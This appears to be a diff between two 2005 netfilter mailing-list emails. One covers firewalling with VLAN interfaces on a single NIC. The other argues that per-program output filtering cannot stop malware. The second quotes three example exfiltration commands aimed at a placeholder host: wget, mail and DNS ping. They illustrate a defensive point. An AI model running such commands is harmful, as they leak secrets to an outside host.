@@ -1,12 +1,12 @@
-From: "Taylor, Grant" <gtaylor@riverviewtech.net>
-Subject: Re: Firewall with only one eth0 device: possible?
-Date: Tue, 31 May 2005 12:53:37 -0500
-Message-ID: <429CA4A1.1030905@riverviewtech.net>
-References: <429C93B2.7040001@gmx.ch>
+From: "R. DuFresne" <dufresne@sysinfo.com>
+Subject: Re: Nice ZoneAlarm that might be useful for Iptables
+Date: Tue, 31 May 2005 14:18:01 -0400 (EDT)
+Message-ID: <Pine.LNX.4.60.0505311407460.5267@darkstar.sysinfo.com>
+References: <429BDF9F.7070707@mindspring.com>
+	<20050531043310.GF3681@der-frank.org>
 Mime-Version: 1.0
-Content-Transfer-Encoding: 7bit
 Return-path: <netfilter-bounces@lists.netfilter.org>
-In-Reply-To: <429C93B2.7040001@gmx.ch>
+In-Reply-To: <20050531043310.GF3681@der-frank.org>
 List-Id: <netfilter.vger.kernel.org>
 List-Unsubscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
 	<mailto:netfilter-request@lists.netfilter.org?subject=unsubscribe>
@@ -17,51 +17,87 @@ List-Subscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
 	<mailto:netfilter-request@lists.netfilter.org?subject=subscribe>
 Sender: netfilter-bounces@lists.netfilter.org
 Errors-To: netfilter-bounces@lists.netfilter.org
-Content-Type: text/plain; charset="us-ascii"
-To: netfilter@lists.netfilter.org
+Content-Type: TEXT/PLAIN; charset="us-ascii"; format="flowed"
+Content-Transfer-Encoding: 7bit
+To: Frank Gruellich <frank@der-frank.org>
+Cc: netfilter@lists.netfilter.org
 
-> I have an embedded system running uclinux with just one ethernet device
-> and wonder whether or not I can build a firewall in combination with a
-> switch (VLAN support, not WLAN).
-> 
-> How I thought it could work is the following:
-> 
-> Configure the eth0 device with an ip and network mask.
-> Configure the eth0:0 alias device with an ip and network mask different
-> from eth0.
-> Use a switch with VLAN support.
-> Connect the eth0 linux device to port B of the switch; switch port A
-> will then be one side of the firewall and port C the other side.
-> Configure the switch (VLAN) in a manner so all the incoming traffic on
-> switch port A will be routed to port B and all the incoming traffic on
-> port B will be routed to port C and back to port A.
-> Finally everything that enters port C will be routed to port B.
-
-You are close to what you need, but not quite there.  Rather than looking at aliased interfaces you need to add support for 802.1q VLAN tagging in the kernel and install VLAN tools (vconfig) on the router.  Once you have done that you will end up creating a VLAN tagged interface named eth0.1 (presuming the VLAN ID is 1) and eth0.2.  Note the "." (period) not the ":" (colon) as this denotes the difference between an alias and a VLAN interface.  You will then bring up your eth0 (raw) interface with out an IP address via "ifconfig eth0 0.0.0.0".  After your raw ethernet interface is up you will need to create your VLAN interfaces via (if memory and reference serves as it's been 6+ months...):
-
-vconfig add eth0 1
-vconfig add eth0 2
-
-Now you will be able to assign IPs as you wish to eth0.1 and eth0.2 as you normally would, you can also firewall across two different devices as you normally would.  All you need to do on the managed switch is establish an 802.1q trunk on the switch port ("B" in your statement) connected to the server / router.  Establish a VLAN with a VID (VLAN ID) of 1 between ports "A" and "B" and a VLAN with a VID of 2 between ports "B" and "C".
-
-> The question about all this is: Will the traffic be filtered between
-> eth0 and eth0:0 as if there were two physical devices eth0 and eth1?
-
-If you do what I have suggested things should work for you.  I have dome something very similar to this on a router at one of my client's.  I say similar because there were two (internal) LANs and 8 (no that is not a typo) cable modems that had to be connected to.  I did all of this with two ports on the router connected to a layer 2 managed switch, one was connected via a VLAN trunk to the various cable modems and the other was connected via a VLAN trunk to the two LANs.  In hind site I would have rather hooked all of the cable modems and LANs to one VLAN trunk and established the other as a backup either by STP or bonding.  STP would have worked with a 30 second down time for STP to realize what's going on, where as I think bonding would have taken over much quicker.
-
-> Thanks for any remarks on that.
-
-No problem.
-
-> PS.: I know, this is an unusual way to build a firewall, but I simply
-> can not change the hardware. For everyone who thinks, it is insecure
-> because of none existing  physical separation: please forgive me.
-
-You will have a pseudo physical, all be it via logical VLAN tags, separation so this should be a non issue.
-
-As usual any comments or question are welcome.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
 
+Zone alarm tends to run on single user systems, and is geared well for 
+that kind of access.  Imagine trying to allow 1500 users the ability to 
+control your fw rules to do something similiar in a production multi-user 
+env, from various systems forwarding through the fw in both directions.
 
-Grant. . . .
+How many gatekeepers would it take to keep an eye on this kind of setup?
+And how well trusted are your average users?
+
+
+Perhaps on a standalone linux desktop this might be feasible, but, 
+certainly not in a real working env.
+
+Thanks,
+
+Ron DuFresne
+
+On Tue, 31 May 2005, Frank Gruellich wrote:
+
+> Hi,
+>
+> * Larry Alkoff <labradley@mindspring.com> 30. May 05:
+>> [Zonealarm]
+>> In addition, it will warn if a program is asking for server rights
+>> although and ask for approval to grant that, although I don't understand
+>> what they mean by "server rights".
+>
+> AFAIK Zonealarm it means, that a program starts a server: it listens on
+> a port.  For Unix it needs root priveleges to listen on ports below 1024
+> (dunno about Windows).
+>
+>> Most Iptables scripts I've seen do very little OUTPUT filtering which
+>> means a malicious program, if it got access somehow, could have free
+>> range to send packets out.  Zombie or spyware perhaps.
+>
+> While OUTPUT has nothing to do with servers, it is simply impossible.
+> You can't protect an infected host.
+>
+>> The ability to block this by only allowing "approved" programs to access
+>> the Internet would be a nice addition to Iptables.
+>
+> Define "access the Internet".  There will be some hundreds of ways for
+> malware to send data you can't even catch with iptables.  There are some
+> more dozens of ways you can't block at all.  How do you intend to catch
+>
+> $ wget 'http://www.hackers.com/script.php?info=this%20is%20my%20very%20secret%20information'
+> $ echo "this is the very secret information" |mail -s "$USER@`hostname -f`" jr@hackers.com
+> $ ping -c1 www.this.is.my.very.secret.information.hackers.com
+>
+> and many other things?  Don't install software you don't trust.  Sorry,
+> but this is AFAICS the only way.
+>
+> Kind regards,
+> Frank.
+> --
+> Sigmentation fault
+>
+
+- -- 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+         admin & senior security consultant:  sysinfo.com
+                         http://sysinfo.com
+Key fingerprint = 9401 4B13 B918 164C 647A  E838 B2DF AFCC 94B0 6629
+
+...We waste time looking for the perfect lover
+instead of creating the perfect love.
+
+                 -Tom Robbins <Still Life With Woodpecker>
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.2.4 (GNU/Linux)
+
+iD8DBQFCnKpcst+vzJSwZikRAjNeAJ0Zjg+ZkUSHAt9ffiTtg4Kq6qe7owCeM6bY
+/sharOZocwpsu3oMUTun5R8=
+=tnSc
+-----END PGP SIGNATURE-----
 
